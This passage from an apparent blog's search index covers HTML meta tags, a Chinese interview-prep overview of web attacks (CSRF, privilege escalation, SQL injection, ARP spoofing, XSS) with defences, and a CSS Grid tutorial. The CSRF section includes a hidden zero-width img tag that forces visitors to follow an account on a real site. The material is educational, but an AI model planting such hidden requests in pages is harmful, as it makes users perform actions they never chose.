class="string">&quot;标题&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>IOS添加智能 App 广告条 Smart App Banner</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;apple-itunes-app&quot;</span> <span class="attr">content</span>=<span class="string">&quot;app-id=myAppStoreID, affiliate-data=myAffiliateData, app-argument=myURL&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>去除 iPhone 识别数字为号码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;format-detection&quot;</span> <span class="attr">content</span>=<span class="string">&quot;telephone=no&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>不识别邮箱</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;format-detection&quot;</span> <span class="attr">content</span>=<span class="string">&quot;email=no&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>禁止跳转至地图</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;format-detection&quot;</span> <span class="attr">content</span>=<span class="string">&quot;adress=no&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>可以连写</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;format-detection&quot;</span> <span class="attr">content</span>=<span class="string">&quot;telephone=no,email=no,adress=no&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Web常见的网络安全问题与原理简析</title>
      <link href="/2020/03/022ccc40ead3.html"/>
      <url>/2020/03/022ccc40ead3.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-CSRF攻击【重点】"><a href="#1-CSRF攻击【重点】" class="headerlink" title="1. CSRF攻击【重点】"></a>1. CSRF攻击【重点】</h1><blockquote><p>文章：<a href="https://www.cnblogs.com/lovesong/p/5233195.html">https://www.cnblogs.com/lovesong/p/5233195.html</a></p></blockquote><h2 id="简述："><a href="#简述：" class="headerlink" title="简述："></a>简述：</h2><p>CSRF（Cross Site Request Forgery），中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后（记录了 Cookie 信息），诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191015144808.png" alt="20191015144808.png"></p><p>其重点在于制造两种条件：</p><ol><li>登录受信任网站 A，并在本地生成 Cookie 。</li><li>在不退出 A 的情况下，访问危险网站 B。</li></ol><h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p>假如博客园有个加关注的GET接口，blogUserGuid参数很明显是关注人Id，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.cnblogs.com/mvc/Follow/FollowBlogger.aspx?blogUserGuid=4e8c33d0-77fe-df11-ac81-842b2b196315</span><br></pre></td></tr></table></figure><p>那我只需要在我的一篇博文内容里面写一个img标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;width:0;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://www.cnblogs.com/mvc/Follow/FollowBlogger.aspx?blogUserGuid=4e8c33d0-77fe-df11-ac81-842b2b196315&quot;</span>   /&gt;</span></span><br></pre></td></tr></table></figure><p>那么只要有人打开我这篇博文，那就会自动关注我。</p><h2 id="预防："><a href="#预防：" class="headerlink" title="预防："></a>预防：</h2><p>CSRF 的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的 CSRF 防御也都在服务端进行。</p><p>服务端的预防 CSRF 攻击的方式方法有多种，但思想上都是差不多的，主要从以下 2 个方面入手：</p><ol><li>正确使用 GET , POST 和 Cookie；</li><li>在非 GET 请求中增加伪随机数；</li></ol><p><a href="https://learnku.com/docs/build-web-application-with-golang/091-prevention-of-csrf-attacks/3209">GoLang 的防御示例</a></p><h1 id="2-越权操作"><a href="#2-越权操作" class="headerlink" title="2. 越权操作"></a>2. 越权操作</h1><blockquote><p>文章：<a href="https://blog.csdn.net/tanzhen1991910/article/details/53220593">https://blog.csdn.net/tanzhen1991910/article/details/53220593</a></p></blockquote><h2 id="简述：-1"><a href="#简述：-1" class="headerlink" title="简述："></a>简述：</h2><p> 越权漏洞是比较常见的漏洞类型，越权漏洞可以理解为，一个正常的用户A通常只能够对自己的一些信息进行增删改查，但是由于程序员的一时疏忽未对信息进行增删改查的时候没有进行一个判断，判断所需要操作的信息是否属于对应的用户，可以导致用户A可以操作其他人的信息。​</p><p>权限攻击可以分为水平权限攻击和垂直权限攻击。</p><h2 id="水平权限攻击"><a href="#水平权限攻击" class="headerlink" title="水平权限攻击"></a>水平权限攻击</h2><p>水平权限攻击，也叫作访问控制攻击。Web应用程序接收到用户请求，修改某条数据时，没有判断数据的所属人，或者在判断数据所属人时从用户提交的表单参数中获取了userid。导致攻击者可以自行修改userid修改不属于自己的数据。所有的更新语句操作，都可能产生这个漏洞。</p><p>从用户的加密认证cookie中获取当前用户id，并且在执行的sql语句中加入当前用户id作为条件语句，这样能防止攻击。</p><h2 id="垂直权限攻击"><a href="#垂直权限攻击" class="headerlink" title="垂直权限攻击"></a>垂直权限攻击</h2><p>垂直权限攻击又叫做权限提升攻击。其原理是由于Web应用没有做权限控制，或仅仅在菜单上做了权限控制，导致恶意用户只要猜测其他管理页面的URL，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。</p><p>这种攻击很容易防御，只需要在每个页面的加载之前进行权限验证即可。一个普通的权限系统，菜单是通过数据库中对应权限和角色来进行字符串拼接形成的，而不是静态的通过在页面上进行权限判断决定的。</p><h1 id="3-SQL注入攻击"><a href="#3-SQL注入攻击" class="headerlink" title="3. SQL注入攻击"></a>3. SQL注入攻击</h1><blockquote><p>文章：<a href="https://www.jianshu.com/p/078df7a35671">https://www.jianshu.com/p/078df7a35671</a></p></blockquote><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。</p><h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><ul><li>严格限制 Web 应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害。</li><li>检查输入的数据是否具有所期望的数据格式，严格限制变量的类型，例如使用 regexp 包进行一些匹配处理，或者使用 strconv 包对字符串转化成其他基本类型的数据进行判断。</li><li>对进入数据库的特殊字符（’”\ 尖括号 &amp;*; 等）进行转义处理，或编码转换。Go 的 <code>text/template</code> 包里面的 <code>HTMLEscapeString</code> 函数可以对字符串进行转义处理。</li><li>所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如使用 <code>database/sql</code> 里面的查询函数 <code>Prepare</code> 和 <code>Query</code>，或者 <code>Exec(query string, args ...interface&#123;&#125;)</code>。</li><li>在应用发布之前建议使用专业的 SQL 注入检测工具进行检测，以及时修补被发现的 SQL 注入漏洞。网上有很多这方面的开源工具，例如 sqlmap、SQLninja 等。</li><li>避免网站打印出 SQL 错误信息，比如类型错误、字段不匹配等，把代码里的 SQL 语句暴露出来，以防止攻击者利用这些错误信息进行 SQL 注入。</li></ul><h1 id="4-ARP攻击"><a href="#4-ARP攻击" class="headerlink" title="4. ARP攻击"></a>4. ARP攻击</h1><blockquote><p>文章：<a href="https://www.cnblogs.com/manue1/p/4462327.html">https://www.cnblogs.com/manue1/p/4462327.html</a></p></blockquote><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>ARP欺骗攻击建立在局域网主机间相互信任的基础上的</p><p>当A发广播询问：我想知道IP是192.168.0.3的硬件地址是多少？</p><p>此时B当然会回话：我是IP192.168.0.3我的硬件地址是mac-b，</p><p>可是此时IP地址是192.168.0.4的C也非法回了：我是IP192.168.0.3,我的硬件地址是mac-c。而且是大量的。</p><p>所以A就会误信192.168.0.3的硬件地址是mac-c，而且动态更新缓存表</p><p>这样主机C就劫持了主机A发送给主机B的数据，这就是ARP欺骗的过程。</p><p>假如C直接冒充网关，此时主机C会不停的发送ARP欺骗广播，大声说：我的ＩＰ是102.168.0.1，我的硬件地址是mac-c，</p><p>此时局域网内所有主机都被欺骗，更改自己的缓存表，此时Ｃ将会监听到整个局域网发送给互联网的数据报。</p><h1 id="5-XSS跨站请求攻击【重点】"><a href="#5-XSS跨站请求攻击【重点】" class="headerlink" title="5. XSS跨站请求攻击【重点】"></a>5. XSS跨站请求攻击【重点】</h1><p>XSS 通常可以分为两大类：一类是存储型 XSS，主要出现在让用户输入数据，供其他浏览此页的用户进行查看的地方，包括留言、评论、博客日志和各类表单等。应用程序从数据库中查询数据，在页面中显示出来，攻击者在相关页面输入恶意的脚本数据后，用户浏览此类页面时就可能受到攻击。这个流程简单可以描述为：恶意用户的 Html 输入 Web 程序 -&gt; 进入数据库 -&gt; Web 程序 -&gt; 用户浏览器。另一类是反射型 XSS，主要做法是将脚本代码加入 URL 地址的请求参数里，请求参数进入程序后在页面直接输出，用户点击类似的恶意链接就可能受到攻击。</p><p>XSS 目前主要的手段和目的如下：</p><ul><li>盗用 cookie，获取敏感信息。</li><li>利用植入 Flash，通过 crossdomain 权限设置进一步获取更高权限；或者利用 Java 等得到类似的操作。</li><li>利用 iframe、frame、XMLHttpRequest 或上述 Flash 等方式，以（被攻击者）用户的身份执行一些管理动作，或执行一些如：发微博、加好友、发私信等常规操作，前段时间新浪微博就遭遇过一次 XSS。</li><li>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li><li>在访问量极大的一些页面上的 XSS 可以攻击一些小型网站，实现 DDoS 攻击的效果</li></ul><h2 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h2><ul><li>在新浪博客写一篇文章，同时偷偷插入一段<code>&lt;script&gt;</code></li><li>攻击代码中，获取cookie，发送自己的服务器</li><li>发布博客，有人查看博客内容</li><li>会把查看者的cookie发送到攻击者的服务器</li></ul><h2 id="预防：-1"><a href="#预防：-1" class="headerlink" title="预防："></a>预防：</h2><ul><li>前端替换关键字，例如替换&lt;为&amp;lt；&gt;为&amp;gt；</li><li>后端替换</li><li>Chrome 针对 XSS 攻击有防御措施</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Grid栅格布局教程</title>
      <link href="/2020/03/8aabc5d2beb7.html"/>
      <url>/2020/03/8aabc5d2beb7.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>教程参考：<a href="https://www.bilibili.com/video/av66220144">https://www.bilibili.com/video/av66220144</a></p></blockquote><h1 id="1-快速入门"><a href="#1-快速入门" class="headerlink" title="1. 快速入门"></a>1. 快速入门</h1><p>Grid 栅格布局类似于表格布局，可以快速将页面分割为多个部分，再在每个部分中去进行更为详细的布局。</p><p>创建一个快速栅格布局的实例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>5<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>6<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>7<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>8<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>9<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">250px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">250px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="comment">/* repeat 可以将某个值重复多遍，fr 是一个 Grid 中新引入的单位 */</span></span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr); <span class="comment">/* 行高 */</span></span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr); <span class="comment">/* 列宽 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.wrapper</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">background-clip</span>: content-box;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">5px</span> solid pink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现效果：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240508232510.png" alt="20240508232510.png|350"></p><p>上述示例中我们将 <code>grid-template-row</code> 与 <code>grid-template-columns</code> 的值采用了简写的方式设为了平分为三等分，同时还可以，使用 px、百分比等作为单位，如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">250px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">250px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="number">100px</span> <span class="number">100px</span> <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="number">100px</span> <span class="number">100px</span> <span class="number">100px</span>;</span><br><span class="line">  <span class="comment">/* 当然，如果这么写的话由于已经设置了宽高，内容会溢出 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240508233000.png" alt="|350"></p><blockquote><p>你可以使用固定的轨道尺寸创建网格，比如使用像素单位。你也可以使用比如百分比或者专门为此目的创建的新单位 fr来创建有弹性尺寸的网格。 -MDN</p></blockquote><p>未定义行高或者列高，元素宽度会根据 grid 进行拉伸，但是高度为默认:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="comment">/** 只定义一行高度，其余行不指定 */</span></span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="number">100px</span> <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240508233349.png" alt="20240508233349.png|350"></p><h1 id="2-重复-repeat"><a href="#2-重复-repeat" class="headerlink" title="2. 重复 repeat"></a>2. 重复 repeat</h1><p><code>repeat</code> 是 Grid 布局引入的一个新特性，可以将某一数值重复多遍。在上面的例子中 <code>grid-template-rows: repeat(3, 1fr);</code>  就相当于 <code>grid-templete-rows: 1fr 1fr 1fr;</code>。同时，<code>repeat</code> 还能重复多个值，如 <code>grid-template-rows: repeat(3, 100px 50px);</code> 就相当于 <code>grid-template-rows: 100px 50px 100px 50px 100px 50px;</code></p><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- ... ...  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>25<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>26<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>27<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">250px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">50px</span> <span class="number">100px</span>);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.wrapper</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">background-clip</span>: content-box;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">5px</span> solid pink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240508233704.png" alt="20240508233704.png|350"></p><h1 id="2-自动填充-repeat-auto-fill"><a href="#2-自动填充-repeat-auto-fill" class="headerlink" title="2. 自动填充 repeat auto-fill"></a>2. 自动填充 repeat auto-fill</h1><p>Grid 中引入了自动填充的特性，在设置容器的行高与列宽时，使用 <code>repeat()</code> 第一个参数如果传入 <code>auto-fill</code> 第二个参数填入一定的数值，那么回自动拿着这个数值重复 n 遍，以填满整个栅格容器。</p><p>例1：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(auto-fill, <span class="number">100px</span>);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(auto-fill, <span class="number">100px</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240508234005.png" alt="20240508234005.png|350"></p><p>例2：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(auto-fill, <span class="number">50px</span>);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(auto-fill, <span class="number">50px</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240508234154.png" alt="image.png|350"></p><p>例3：</p><p>测试溢出时的情况</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(auto-fill, <span class="number">100px</span>);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(auto-fill, <span class="number">100px</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240508234255.png" alt="image.png|350"></p><h1 id="3-取值范围-minmax"><a href="#3-取值范围-minmax" class="headerlink" title="3. 取值范围 minmax"></a>3. 取值范围 minmax</h1><p>在设置行高与宽高时，还可以通过 <code>minmax</code> 来设置值的取值范围。</p><p>例1：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="built_in">minmax</span>(<span class="number">50px</span>, <span class="number">100px</span>));</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(auto-fill, <span class="number">100px</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240508234417.png" alt="image.png|350"></p><p>例2：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">2</span>, <span class="built_in">minmax</span>(<span class="number">50px</span>, <span class="number">100px</span>));</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(auto-fill, <span class="number">100px</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240508234551.png" alt="image.png|550"></p><blockquote><p>为了不让第三行元素溢出，前两行元素的高度自动设定为 73px</p></blockquote><h1 id="4-间距-gap"><a href="#4-间距-gap" class="headerlink" title="4. 间距 gap"></a>4. 间距 gap</h1><p>使用 <code>row-gap</code> 可以设置行间距，设置 <code>column-gap</code> 可以设置列间距</p><p>例1，row-gap：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>5<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>6<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>7<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>8<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span 